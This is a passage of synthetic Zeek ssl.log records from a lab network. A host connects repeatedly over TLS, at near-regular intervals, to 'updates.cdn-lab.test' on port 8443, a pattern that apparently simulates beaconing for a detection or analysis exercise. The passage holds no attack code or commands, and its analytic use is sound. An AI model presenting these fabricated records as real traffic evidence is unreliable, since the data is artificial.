1793801097.554701	CAz8vd4faDVkALHlUb	192.168.56.40	49506	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793801154.199956	CFtURd4sol8pHDgLrj	192.168.56.40	49507	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793801219.364220	C9SOdThDTpYZX761k	192.168.56.40	49508	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793801225.364220	Ccw67I2GayvxOjVUT6	192.168.56.40	49509	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793801285.533835	CzQNrT2RizULTj4Txk	192.168.56.40	49510	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793801307.881923	CqwXHJ2G35ZTXeMWw9	192.168.56.40	50101	198.51.100.20	443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	www.example.test	F	-	-	T	CsnGIi	-	-	-	-
1793801345.299678	CJGE614daWVPKlIwFl	192.168.56.40	49511	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793801414.944000	CIqMz41Ye7qk8xZMZ	192.168.56.40	49512	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793801470.705728	Cm0JwF3CHbmm1snavh	192.168.56.40	49513	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793801539.460459	CkIjuG1FI1ddsNTfV4	192.168.56.40	49514	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793801590.904745	C4FkZotR3FH1wLRkk	192.168.56.40	49515	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793801657.382104	CPZOLl3MC5KITnlS2a	192.168.56.40	49516	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793801713.614748	CdlV2M2bVPRWwdBVo5	192.168.56.40	49517	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793801767.864586	CWaLw5yDJdSJ0Jeh	192.168.56.40	49518	203.0.113.50	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
```

### zeek/tsv/ssl.log — tail -n 12
```
1793802905.099128	ChCcZ62o3euOdQSFP1	192.168.56.40	50106	198.51.100.20	443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	www.example.test	F	-	-	T	CsnGIi	-	-	-	-
1793802931.176764	CqeaUv18BPzebAKIsg	192.168.56.40	49538	203.0.113.51	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793802980.196543	CpsewY3sggTxx4DdRj	192.168.56.40	49539	203.0.113.51	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793803037.331251	C8lWbP3uINhrCnQdu4	192.168.56.40	49540	203.0.113.51	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793803097.944903	C1Lmzv2vPU5QIllSx1	192.168.56.40	49541	203.0.113.51	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793803148.976111	CiRNUk2IGQGem8RlT	192.168.56.40	49542	203.0.113.51	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793803208.477413	Cc6ioQ3rHZJ4tdSbl2	192.168.56.40	49543	203.0.113.51	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793803266.040327	C4Ld423NXUMNhJdwkj	192.168.56.40	49544	203.0.113.51	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793803335.412345	CbJCEIYJVlLKsOnKf	192.168.56.40	49545	203.0.113.51	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793803390.998137	Cx1lVT33ISfDIgcjpk	192.168.56.40	49546	203.0.113.51	8443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	updates.cdn-lab.test	F	-	-	T	CsnGIi	-	-	-	-
1793803391.396803	CPay62pf2nPXZhLKc	192.168.56.40	50105	198.51.100.20	443	TLSv12	TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256	-	www.example.test	F	-	-	T	CsnGIi	-	-	-	-
#close	2026-11-18-19-06-19
```

